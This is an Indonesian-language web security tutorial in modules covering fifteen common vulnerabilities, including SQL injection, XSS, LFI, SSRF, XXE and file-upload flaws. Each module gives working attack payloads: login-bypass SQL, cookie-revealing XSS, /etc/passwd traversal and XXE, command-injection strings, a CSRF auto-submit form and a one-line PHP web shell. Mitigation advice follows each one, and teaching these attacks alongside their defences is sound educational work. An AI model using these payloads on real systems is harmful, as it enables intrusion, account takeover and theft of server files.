Modul: SQL Injection (SQLi)

1. Pengantar: Apa Itu SQLi?

SQL Injection (SQLi) adalah teknik serangan yang menyuntikkan kode SQL berbahaya melalui input aplikasi. Tujuannya adalah untuk memanipulasi basis data (database) agar melakukan perintah yang tidak seharusnya. Ini adalah salah satu kerentanan web paling umum dan berbahaya.

Analoginya: Kamu meminta seorang penjaga toko untuk mengambilkan barang dengan menyebutkan namanya, tapi kamu menyelipkan perintah rahasia di tengah kalimatmu, seperti "ambilkan buku dan buka brankasnya". Penjaga toko, karena tidak terlatih, mengikuti semua perintahmu tanpa memisahkan yang mana perintah normal dan mana yang berbahaya.

2. Cara Kerja dan Dampak

Ketika aplikasi web menerima input dari pengguna (misalnya, nama pengguna atau kata sandi), ia sering kali langsung memasukkannya ke dalam kueri SQL. Jika tidak ada validasi, penyerang dapat menyisipkan kode SQL mereka sendiri.

Dampak yang Ditimbulkan:

  • Pencurian Data: Mengambil data sensitif seperti informasi pengguna, kata sandi, atau data kartu kredit.
  • Modifikasi Data: Mengubah atau menghapus data di database.
  • Penguasaan Penuh: Dalam kasus terparah, SQLi dapat digunakan untuk mendapatkan akses ke sistem operasi (RCE) jika database memiliki izin yang terlalu tinggi.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi SQLi:

Coba tambahkan karakter kutip tunggal (') di parameter URL. Misalnya: http://site.com/produk?id=1 menjadi http://site.com/produk?id=1'. Jika halaman error atau menampilkan hasil yang tidak terduga, itu bisa jadi indikasi SQLi.

B. Payload Eksploitasi:

Payload adalah kode yang disuntikkan. Beberapa contohnya:

' OR 1=1--

Payload ini akan selalu bernilai benar, sehingga bisa digunakan untuk bypass login. Tanda `--` adalah komentar di SQL, jadi sisa kueri akan diabaikan.

' UNION SELECT 1,2,3--

Payload ini digunakan untuk menggabungkan hasil kueri asli dengan kueri penyerang. Penyerang bisa mengganti `1,2,3` dengan nama kolom atau data sensitif yang ingin diambil.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Gunakan Prepared Statements: Ini adalah metode paling efektif. Kueri SQL dikirimkan ke database secara terpisah dari data pengguna, sehingga database tidak akan pernah menganggap input sebagai kode SQL.
  • Validasi Input: Selalu periksa dan sanitasi input dari pengguna. Pastikan data yang dimasukkan sesuai dengan format yang diharapkan (misalnya, angka untuk ID).

Modul: Cross-Site Scripting (XSS)

1. Pengantar: Apa Itu XSS?

Cross-Site Scripting (XSS) adalah kerentanan di mana penyerang menyuntikkan kode skrip berbahaya (biasanya JavaScript) ke dalam halaman web. Kode ini kemudian dieksekusi oleh browser pengguna lain, bukan server.

Analoginya: Kamu menulis pesan di papan pengumuman. Seseorang diam-diam menempelkan pesan kecil berisi instruksi "curang" di belakang pesanmu. Setiap orang yang membaca pesanmu, secara tidak sadar juga membaca dan mengikuti instruksi curang tersebut.

2. Cara Kerja dan Dampak

Ada tiga jenis XSS:

  • Reflected XSS: Skrip disuntikkan melalui URL dan hanya memengaruhi pengguna yang mengeklik URL tersebut.
  • Stored XSS: Skrip berbahaya disimpan di database (misalnya di kolom komentar) dan akan dieksekusi oleh setiap pengguna yang mengunjungi halaman tersebut.
  • DOM-based XSS: Terjadi ketika skrip dieksekusi oleh browser tanpa melalui server, sering kali karena manipulasi DOM (Document Object Model).

Dampak yang Ditimbulkan:

  • Pencurian Cookie Sesi: Penyerang dapat mengambil cookie yang digunakan untuk login, lalu membajak akun pengguna.
  • Pengubahan Halaman Web: Mengubah konten halaman, seperti menyisipkan form login palsu (phishing).
  • Pengalihan Pengguna: Mengarahkan pengguna ke situs berbahaya.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi XSS:

Cari fitur input seperti kolom pencarian, komentar, atau parameter URL yang menampilkan kembali input pengguna. Coba masukkan payload dasar seperti:

<script>alert('XSS')</script>

Jika muncul pop-up alert di browser, itu adalah bukti XSS.

B. Payload Eksploitasi:

<img src=x onerror=alert(document.cookie)>

Ini adalah payload yang sering digunakan untuk menghindari filter. Jika dieksekusi, ia akan menampilkan cookie sesi pengguna.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Output Encoding: Selalu enkode data yang dimasukkan pengguna sebelum menampilkannya di halaman. Ini mengubah karakter khusus menjadi entitas HTML agar tidak dieksekusi sebagai kode.
  • Sanitasi Input: Hapus atau netralkan karakter-karakter berbahaya dari input.
  • Content Security Policy (CSP): Gunakan header CSP untuk menginstruksikan browser agar hanya menjalankan skrip dari sumber yang terpercaya.

Modul: Local File Inclusion (LFI)

1. Pengantar: Apa Itu LFI?

Local File Inclusion (LFI) adalah kerentanan di mana penyerang dapat membaca file dari sistem lokal server melalui manipulasi input. Ini terjadi ketika aplikasi web menyertakan file berdasarkan parameter yang diberikan pengguna tanpa validasi yang benar.

Analoginya: Kamu bisa memesan makanan di menu dengan menyebutkan nama item, tapi kamu menemukan cara untuk menyebutkan "item di dapur belakang" dan server mengabulkan permintaanmu tanpa menyadari bahwa itu adalah area terlarang.

2. Cara Kerja dan Dampak

LFI sering kali terjadi pada fungsi yang bertugas menyertakan file, seperti `include()` di PHP. Ketika penyerang menyisipkan nama file sistem (misalnya, `/etc/passwd` di Linux) ke dalam parameter, aplikasi akan membaca file tersebut.

Dampak yang Ditimbulkan:

  • Pembacaan File Sensitif: Penyerang dapat membaca file konfigurasi, kode sumber, atau data sensitif lainnya dari server.
  • Potensi RCE: Dengan menggabungkan LFI dengan kerentanan lain (seperti file upload), penyerang bisa mendapatkan eksekusi kode di server.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi LFI:

Cari parameter URL yang mengarahkan ke file, seperti `page=`, `file=`, atau `halaman=`. Contohnya: http://site.com/index.php?page=konten.php

B. Payload Eksploitasi:

Coba ganti nilai parameter dengan jalur file sistem menggunakan traversal direktori (`../`).

../../../../etc/passwd

Payload ini akan mencoba keluar dari direktori web server dan membaca file `passwd` yang berisi daftar pengguna sistem.

....//....//....//....//etc/passwd

Payload ini adalah variasi untuk melewati filter sederhana yang menghapus `../`.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Gunakan Whitelist: Buat daftar file yang diizinkan untuk diakses. Abaikan semua permintaan lain.
  • Validasi Input: Hapus semua karakter yang tidak diinginkan dari input pengguna, seperti `..` atau `/`.
  • Jadikan Fungsi Include Statis: Sebisa mungkin, hindari menyertakan file berdasarkan input pengguna.

Modul: Remote Code Execution (RCE)

1. Pengantar: Apa Itu RCE?

Remote Code Execution (RCE) adalah kerentanan keamanan paling parah di mana penyerang dapat mengeksekusi perintah di server dari jarak jauh. Ini memberikan penyerang kendali penuh atas server target.

2. Cara Kerja dan Dampak

RCE terjadi ketika aplikasi web menjalankan input pengguna sebagai perintah sistem operasi atau kode pemrograman tanpa validasi yang ketat. Ini bisa terjadi melalui kerentanan lain seperti Command Injection atau File Upload. Setelah mendapatkan RCE, penyerang bisa melakukan apa saja di server, seperti: menginstal malware, mencuri data, atau menggunakan server sebagai basis untuk menyerang jaringan lain.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi RCE:

Cari fitur yang berinteraksi dengan sistem operasi, misalnya fitur `ping` atau `diagnostik jaringan`. Coba masukkan perintah dasar yang dipisahkan oleh karakter khusus.

B. Payload Eksploitasi:

Menggunakan karakter pemisah perintah seperti `|`, `&`, atau `;`:

127.0.0.1; ls -la

Jika `ls -la` dieksekusi, penyerang akan melihat daftar file di server. Ini adalah bukti adanya kerentanan.

127.0.0.1 && whoami

`whoami` akan menampilkan nama pengguna yang sedang menjalankan web server.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Hindari Fungsi Berbahaya: Jangan gunakan fungsi seperti `eval()`, `system()`, atau `exec()` dengan input pengguna.
  • Whitelist Input: Jika memang harus menggunakan perintah sistem, gunakan daftar input yang diizinkan (misalnya, hanya izinkan angka atau alamat IP).

Modul: Cross-Site Request Forgery (CSRF)

1. Pengantar: Apa Itu CSRF?

Cross-Site Request Forgery (CSRF) adalah serangan yang memaksa pengguna yang sudah terautentikasi (sudah login) untuk melakukan tindakan yang tidak mereka inginkan di sebuah situs web yang rentan.

2. Cara Kerja dan Dampak

Penyerang mengirimkan link atau gambar berbahaya yang berisi permintaan HTTP. Ketika pengguna yang sudah login mengklik link tersebut, browser-nya akan otomatis menyertakan cookie sesi mereka dan mengirimkan permintaan berbahaya ke situs web yang rentan, seolah-olah permintaan itu datang dari pengguna yang sah.

Dampak yang Ditimbulkan:

  • Mengubah kata sandi pengguna.
  • Melakukan transfer dana dari rekening pengguna.
  • Mengirimkan pesan atau postingan atas nama pengguna.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi CSRF:

Cari form yang melakukan tindakan sensitif (misalnya, form ganti password). Periksa apakah form tersebut memiliki token CSRF yang unik dan acak.

B. POC Eksploitasi:

Buat halaman HTML sederhana yang berisi form tersembunyi yang akan mengirimkan permintaan jahat ke situs rentan saat halaman dimuat.

<html>
    <body onload="document.forms[0].submit()">
        <form action="http://situs-rentan.com/ganti-password" method="POST">
            <input type="hidden" name="password_baru" value="hacked123">
        </form>
    </body>
</html>

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Gunakan Token Anti-CSRF: Ini adalah cara paling efektif. Tambahkan token unik dan acak untuk setiap form dan verifikasi di sisi server.
  • Header `SameSite`: Gunakan atribut `SameSite=Lax` atau `SameSite=Strict` pada cookie sesi untuk mencegah browser mengirimkan cookie dalam permintaan cross-site.

Modul: Server-Side Request Forgery (SSRF)

1. Pengantar: Apa Itu SSRF?

Server-Side Request Forgery (SSRF) adalah kerentanan di mana penyerang dapat memaksa server web untuk mengirimkan permintaan ke URL yang ditentukan oleh penyerang. Ini berbeda dari CSRF karena serangan ini terjadi di sisi server.

2. Cara Kerja dan Dampak

SSRF terjadi ketika aplikasi web mengambil URL dari input pengguna dan kemudian mengambil data dari URL tersebut tanpa validasi yang memadai. Penyerang bisa menyisipkan URL yang mengarah ke server internal, API internal, atau bahkan file lokal.

Dampak yang Ditimbulkan:

  • Mengakses layanan internal yang seharusnya tidak terekspos ke internet.
  • Memindai port dan layanan di jaringan internal server.
  • Membaca file sensitif melalui skema URL seperti `file://`.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi SSRF:

Cari parameter URL yang mengambil URL lain sebagai input, misalnya: `http://site.com/image_proxy?url=...`

B. Payload Eksploitasi:

http://site.com/image_proxy?url=http://127.0.0.1

Payload ini akan memaksa server untuk mengakses dirinya sendiri. Jika server merespons dengan konten halaman utama, itu adalah bukti SSRF.

http://site.com/image_proxy?url=file:///etc/passwd

Payload ini mencoba membaca file `passwd` di server.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Validasi Input: Lakukan validasi ketat pada URL yang diberikan pengguna. Gunakan daftar izin (whitelist) untuk host dan protokol yang diizinkan.
  • Jangan Izinkan Redirect: Matikan fitur `redirect` otomatis pada permintaan HTTP dari sisi server.

Modul: Insecure Direct Object Reference (IDOR)

1. Pengantar: Apa Itu IDOR?

Insecure Direct Object Reference (IDOR) adalah kerentanan di mana penyerang dapat mengakses objek (misalnya file, data, atau akun pengguna) dengan mengubah nilai parameter yang mengacu pada objek tersebut, tanpa ada validasi otorisasi.

2. Cara Kerja dan Dampak

Ketika aplikasi web menggunakan ID yang bisa ditebak atau diubah (misalnya ID pengguna `123`, `124`, `125`), penyerang bisa mencoba mengubah ID tersebut. Jika server tidak memverifikasi apakah pengguna saat ini berhak mengakses ID tersebut, maka penyerang bisa melihat data milik pengguna lain.

Dampak yang Ditimbulkan:

  • Mengakses, mengubah, atau menghapus data pengguna lain.
  • Mengambil alih akun pengguna lain.
  • Mendapatkan akses ke informasi yang seharusnya terbatas.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi IDOR:

Lakukan tindakan di web dan perhatikan parameter URL atau form. Contoh: `http://site.com/profile?id=123`

B. POC Eksploitasi:

Ubah nilai `id` menjadi nilai lain yang mungkin, misalnya `id=124` atau `id=1`. Jika kamu bisa melihat profil milik pengguna lain tanpa login sebagai mereka, maka IDOR berhasil ditemukan.

IDOR tidak hanya terbatas pada URL, bisa juga pada permintaan API, seperti:

POST /api/user/123/edit

Dengan mengganti `123` menjadi `124` dalam permintaan POST, penyerang bisa mengubah data pengguna lain.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Gunakan Mekanisme Kontrol Akses: Sebelum menampilkan atau mengubah data, selalu verifikasi bahwa pengguna yang sedang login memiliki hak untuk mengakses ID tersebut.
  • Gunakan ID yang Sulit Ditebak: Gunakan UUID (Universally Unique Identifier) yang panjang dan acak, bukan ID numerik yang berurutan.

Modul: Authentication Bypass

1. Pengantar: Apa Itu Authentication Bypass?

Authentication Bypass adalah kerentanan yang memungkinkan penyerang untuk melewati mekanisme login atau otentikasi suatu aplikasi web dan mendapatkan akses ke akun pengguna atau area yang seharusnya terlarang, seperti panel admin.

2. Cara Kerja dan Dampak

Authentication Bypass terjadi karena berbagai alasan, seperti validasi input yang lemah (misalnya, SQLi), manipulasi cookie atau sesi, atau logika aplikasi yang cacat. Dampak dari serangan ini sangat serius, termasuk pengambilalihan akun dan akses penuh ke data atau fungsi yang seharusnya terlindungi.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi Authentication Bypass:

Coba gunakan payload SQLi sederhana pada form login. Jika berhasil, kamu bisa login tanpa kata sandi yang benar. Selain itu, coba akses halaman yang seharusnya dilindungi tanpa login.

B. POC Eksploitasi:

Username: ' OR 1=1--
Password: (apapun)

Payload ini akan membuat kueri SQL selalu bernilai benar, sehingga kamu bisa login sebagai pengguna pertama di database (seringkali admin).

http://site.com/admin_dashboard

Coba akses langsung URL ini. Jika berhasil, maka tidak ada kontrol akses yang benar.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Gunakan Prepared Statements: Mencegah SQLi yang sering menjadi penyebab bypass.
  • Validasi Hak Akses: Selalu verifikasi hak akses di sisi server untuk setiap halaman yang dilindungi.
  • Kelola Sesi dengan Aman: Gunakan sesi yang kuat dan tidak bisa ditebak.

Modul: File Upload Vulnerability

1. Pengantar: Apa Itu File Upload Vulnerability?

File Upload Vulnerability adalah kerentanan yang terjadi ketika aplikasi web mengizinkan pengguna mengunggah file tanpa validasi yang memadai. Penyerang dapat mengunggah file berbahaya (misalnya, skrip shell) untuk mendapatkan Remote Code Execution (RCE) di server.

2. Cara Kerja dan Dampak

Kerentanan ini sering terjadi karena aplikasi hanya memeriksa ekstensi file di sisi klien (frontend) atau memiliki blacklist ekstensi yang tidak lengkap. Penyerang dapat mengunggah skrip berbahaya dan kemudian mengaksesnya melalui URL, sehingga skrip tersebut dieksekusi di server.

Dampak yang Ditimbulkan:

  • Remote Code Execution (RCE): Ini adalah dampak terburuk.
  • Deface Website: Mengubah tampilan situs.
  • Pencurian Data: Mengunggah skrip untuk mencuri data dari server.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi File Upload Vulnerability:

Cari fitur unggah file, seperti unggah foto profil atau lampiran. Coba unggah file dengan ekstensi berbahaya.

B. Payload Eksploitasi:

Unggah file yang berisi skrip PHP sederhana, misalnya `shell.php`:

<?php system($_GET['cmd']); ?>

Setelah file diunggah, akses file tersebut di browser dengan menambahkan perintah: `http://site.com/uploads/shell.php?cmd=whoami`. Jika output perintah `whoami` muncul, kerentanan berhasil dieksploitasi.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Validasi di Sisi Server: Lakukan validasi ekstensi, ukuran, dan tipe file di sisi server.
  • Gunakan Whitelist: Izinkan hanya ekstensi file yang benar-benar dibutuhkan, seperti `.jpg`, `.png`, atau `.pdf`.
  • Ubah Nama File: Ubah nama file yang diunggah menjadi nama acak yang sulit ditebak.

Modul: Command Injection

1. Pengantar: Apa Itu Command Injection?

Command Injection adalah serangan di mana penyerang dapat mengeksekusi perintah pada sistem operasi host melalui input yang tidak divalidasi. Serangan ini sering berujung pada Remote Code Execution (RCE).

2. Cara Kerja dan Dampak

Kerentanan ini terjadi ketika aplikasi web mengambil input dari pengguna dan meneruskannya langsung ke fungsi sistem operasi. Dengan menggunakan karakter khusus seperti `|`, `;`, atau `&`, penyerang dapat "menyambung" perintah mereka sendiri.

Dampak yang Ditimbulkan: Sama dengan RCE. Penyerang dapat mengontrol server sepenuhnya, membaca, mengubah, atau menghapus file sistem.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi Command Injection:

Cari fitur di web yang menjalankan perintah sistem, seperti fitur "Ping" yang memproses alamat IP.

B. Payload Eksploitasi:

127.0.0.1; ls -la

Pada fitur ping, coba masukkan payload di atas. Tanda `;` akan memisahkan perintah `ping` dari perintah `ls -la`. Jika output `ls -la` muncul, berarti server rentan.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Hindari Fungsi Berbahaya: Jangan gunakan fungsi seperti `system()` atau `exec()` dengan input pengguna.
  • Gunakan API Aman: Gunakan API yang aman untuk berinteraksi dengan sistem operasi, seperti `proc_open()` di PHP yang memiliki lebih banyak kontrol.
  • Validasi Input: Gunakan whitelist untuk karakter yang diizinkan.

Modul: Open Redirect

1. Pengantar: Apa Itu Open Redirect?

Open Redirect adalah kerentanan di mana aplikasi web mengizinkan penyerang untuk memanipulasi parameter URL yang digunakan untuk redirect pengguna ke URL eksternal yang berbahaya. Kerentanan ini sering digunakan dalam serangan phishing.

2. Cara Kerja dan Dampak

Beberapa aplikasi web memiliki fitur yang mengalihkan pengguna ke halaman lain setelah suatu tindakan selesai. Jika URL tujuan diambil langsung dari input pengguna tanpa divalidasi, penyerang bisa mengalihkan korban ke situs phishing yang terlihat mirip dengan situs aslinya.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi Open Redirect:

Cari parameter URL seperti `redirect=`, `url=`, `next=`, atau `halaman=`. Contoh: `http://site.com/login?redirect=/dashboard`

B. POC Eksploitasi:

Ganti URL redirect dengan situs berbahaya:

http://site.com/login?redirect=http://situs-phishing.com

Jika kamu dialihkan ke situs phishing, kerentanan berhasil ditemukan.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Gunakan Whitelist URL: Buat daftar URL yang diizinkan untuk redirect.
  • Validasi dan Enkode Input: Pastikan URL yang diterima sesuai format yang aman.

Modul: Broken Access Control

1. Pengantar: Apa Itu Broken Access Control?

Broken Access Control adalah kerentanan di mana aplikasi web gagal untuk mengontrol hak akses pengguna dengan benar. Ini memungkinkan pengguna biasa untuk mengakses fungsi atau data yang seharusnya hanya dapat diakses oleh pengguna dengan hak istimewa (misalnya, administrator).

2. Cara Kerja dan Dampak

Ini terjadi karena aplikasi tidak memverifikasi hak akses pengguna saat ia mencoba mengakses suatu sumber daya. Dampaknya bisa sangat serius, mulai dari pengungkapan data sensitif hingga pengambilalihan penuh akun admin.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi Broken Access Control:

Login sebagai pengguna biasa. Coba akses URL atau fitur yang kamu tahu seharusnya hanya bisa diakses oleh admin, misalnya `http://site.com/admin/settings`.

B. POC Eksploitasi:

Gunakan IDOR (IDOR adalah salah satu bentuk Broken Access Control) untuk melihat data pengguna lain. Misalnya, di URL `http://site.com/api/v1/user/123`, ganti `123` dengan `1`. Jika kamu bisa melihat data admin, maka kerentanan ini terbukti.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Implementasikan Kontrol Akses Terpusat: Pastikan setiap permintaan ke sumber daya yang dilindungi melalui fungsi yang memverifikasi hak akses pengguna.
  • Gunakan Prinsip Least Privilege: Berikan setiap pengguna hanya hak akses yang benar-benar mereka butuhkan.

Modul: Information Disclosure

1. Pengantar: Apa Itu Information Disclosure?

Information Disclosure adalah kerentanan di mana aplikasi web secara tidak sengaja mengungkapkan informasi sensitif tentang dirinya sendiri, infrastruktur, atau pengguna kepada penyerang. Informasi ini bisa digunakan penyerang untuk merencanakan serangan lebih lanjut.

2. Cara Kerja dan Dampak

Kerentanan ini sering terjadi karena kesalahan konfigurasi, pesan error yang terlalu detail, atau file yang seharusnya tidak terekspos ke publik. Penyerang bisa mendapatkan informasi penting seperti versi server, jalur direktori, atau data pengguna yang bisa di-exploit lebih lanjut.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi Information Disclosure:

Perhatikan pesan error. Jika error yang muncul terlalu detail (misalnya, menampilkan baris kode sumber atau query database), itu adalah indikasi Information Disclosure.

B. Contoh:

Mengakses URL yang tidak ada, seperti `http://site.com/halaman_yg_ga_ada`. Jika server merespons dengan pesan error yang menunjukkan versi PHP, versi database, atau jalur direktori, itu adalah bukti Information Disclosure.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Jangan Tampilkan Error Verbose: Gunakan pesan error umum dan log error yang detail di sisi server, jangan di sisi pengguna.
  • Hapus File Konfigurasi Default: Hapus file konfigurasi server yang tidak diperlukan.
  • Jangan Tampilkan Versi Aplikasi: Sembunyikan versi server web, framework, dan bahasa pemrograman dari header respons HTTP.

Modul: Security Misconfiguration

1. Pengantar: Apa Itu Security Misconfiguration?

Security Misconfiguration adalah kerentanan yang terjadi karena pengaturan keamanan yang salah pada aplikasi web, server, framework, atau komponen lainnya. Ini adalah salah satu kerentanan paling umum karena mudah terjadi.

2. Cara Kerja dan Dampak

Ini terjadi karena pengaturan default yang tidak aman, manajemen error yang salah, atau hak akses yang terlalu longgar. Penyerang dapat memanfaatkan miskonfigurasi ini untuk mengakses fitur terlarang, mendapatkan data sensitif, atau bahkan mengambil alih server.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi Security Misconfiguration:

Cari halaman atau direktori yang seharusnya terlindungi tetapi bisa diakses. Coba cari file backup atau direktori yang menampilkan daftar file (directory listing).

B. Contoh:

Mengakses `http://site.com/.git/config`. Jika kamu bisa melihat file ini, berarti server salah mengonfigurasi `web root` dan membiarkan direktori `.git` terekspos.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Ganti Konfigurasi Default: Selalu ubah kredensial default yang ada.
  • Terapkan Prinsip Least Privilege: Pastikan setiap akun, termasuk akun database, hanya memiliki hak akses yang dibutuhkan.
  • Otomatisasi: Gunakan alat untuk memindai miskonfigurasi secara otomatis.

Modul: XML External Entity (XXE)

1. Pengantar: Apa Itu XXE?

XML External Entity (XXE) adalah kerentanan yang terjadi ketika aplikasi web memproses input XML yang berisi referensi ke entitas eksternal. Penyerang dapat mengeksploitasi fitur ini untuk membaca file lokal atau mengakses sumber daya internal lainnya.

2. Cara Kerja dan Dampak

XML memiliki fitur yang memungkinkan dokumen untuk mereferensikan "entitas" eksternal, seperti URL atau file. Jika parser XML tidak dikonfigurasi dengan benar, penyerang bisa mengirimkan data XML yang jahat. Ini bisa digunakan untuk membaca file lokal, melakukan serangan DoS, atau SSRF.

3. Teknik Eksploitasi (Langkah Praktis)

A. Mengidentifikasi XXE:

Cari aplikasi yang menerima input dalam format XML. Coba kirimkan payload XML dasar.

B. POC Eksploitasi:

<?xml version="1.0" ?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<test>&xxe;</test>

Payload di atas akan mencoba membaca file `/etc/passwd`. Jika aplikasi merespons dengan isi file tersebut, XXE berhasil.

4. Mitigasi dan Pencegahan

Untuk Pengembang Web:

  • Nonaktifkan DTD dan Entitas Eksternal: Konfigurasikan parser XML untuk menonaktifkan pemrosesan DTD dan entitas eksternal.
  • Gunakan Library Aman: Gunakan library parsing XML yang secara default memiliki konfigurasi yang aman.
